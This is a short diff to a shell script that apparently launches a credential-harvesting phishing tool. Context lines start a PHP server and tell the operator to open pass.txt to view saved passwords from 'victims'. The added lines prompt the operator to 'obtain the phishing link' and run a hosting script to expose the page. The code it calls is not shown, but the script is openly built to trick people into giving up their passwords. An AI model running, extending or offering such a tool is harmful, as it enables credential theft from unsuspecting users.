@@ -10,3 +10,6 @@ echo "TYPE \'nano pass.txt\' To View Victims"
 php start.php
 clear
 echo "To access all saved passwords from victims, type \'nano pass.txt\'"
+echo "This tool uses HTR-TECH's Hosting tool from github."
+echo "SELECT ONE AND OBTAIN THE PHISHING LINK"
+bash host.sh
